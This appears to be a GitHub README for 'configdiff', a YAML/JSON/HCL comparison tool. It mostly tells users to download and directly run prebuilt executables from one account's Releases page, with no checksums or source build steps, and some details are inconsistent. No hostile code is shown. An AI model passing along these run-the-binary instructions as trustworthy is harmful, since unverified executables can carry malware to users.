# 🎉 configdiff - Effortless YAML/JSON/HCL Comparisons

## 📥 Download Now
[![Download configdiff](https://img.shields.io/badge/Download%20configdiff-latest%20release-brightgreen.svg)](https://github.com/saddam237262/configdiff/releases)

## 🚀 Getting Started
Welcome to configdiff! This tool helps you compare YAML, JSON, and HCL configuration files clearly and effectively. Whether you're managing cloud resources or setting up software, configdiff makes the task easier.

### 📂 System Requirements
- **Operating System:** Windows, macOS, or Linux
- **Go Version:** Compatible with version 1.16 or later
- **Memory:** At least 512 MB RAM
- **Disk Space:** Minimum of 50 MB available space

## 📦 Download & Install
To get started with configdiff, follow these simple steps:

1. Click the link below to visit the Releases page.
   
   [Download configdiff from Releases](https://github.com/saddam237262/configdiff/releases)

2. On the Releases page, select the latest version of configdiff.
3. Download the appropriate file for your system.
   - For Windows, download `configdiff_windows.exe`.
   - For macOS, download `configdiff_darwin`.
   - For Linux, download `configdiff_linux`.
   
4. Once the download is complete, locate the file on your computer.

5. **Installation Steps:**
   - **Windows:** Double-click `configdiff_windows.exe` to run it.
   - **macOS:** Open the Terminal and navigate to the file's location. Execute the command `./configdiff_darwin`.
   - **Linux:** Open a terminal, navigate to the file's location, and run `chmod +x configdiff_linux` followed by `./configdiff_linux`.

After installation, you’re all set to use configdiff!

## 🛠️ Usage
Using configdiff is straightforward. Here’s how to compare files:

1. Open your terminal or command prompt.
2. Type the following command to compare two files:
   ```
   configdiff path/to/first/file path/to/second/file
   ```
3. Navigate to the directory where your configuration files are stored.
4. Replace `path/to/first/file` and `path/to/second/file` with the actual paths to your YAML, JSON, or HCL files.
5. Press Enter to see the differences displayed clearly.

## 📊 Features
- **Semantic Comparisons:** Understand differences that matter, not just line changes.
- **Support for Multiple Formats:** Work with YAML, JSON, and HCL files effortlessly.
- **User-Friendly Output:** Clear, concise output for easy analysis.
- **Lightweight and Fast:** Minimal system resource usage ensures quick comparisons.

## 🔍 Example
To illustrate, let’s say you have the following YAML files:

**File 1: `config1.yaml`**
```yaml
server:
  host: localhost
  port: 8080
```

**File 2: `config2.yaml`**
```yaml
server:
  host: 127.0.0.1
  port: 8080
```

You would run:
```
configdiff config1.yaml config2.yaml
```

The output will highlight the difference in the `host` value.

## 📝 Support
If you face any issues, or need help using configdiff, check the [Issues page](https://github.com/saddam237262/configdiff/issues). We're here to assist you!

## 🌟 Additional Resources
- [GitHub Repository](https://github.com/saddam237262/configdiff)
- [Documentation](https://github.com/saddam237262/configdiff/wiki)
- [Community Discussions](https://github.com/saddam237262/configdiff/discussions)

## ⚙️ Contributions
We welcome contributions! If you have suggestions or improvements, feel free to submit a pull request.

Thank you for using configdiff! Download it today and streamline your configuration management tasks effortlessly.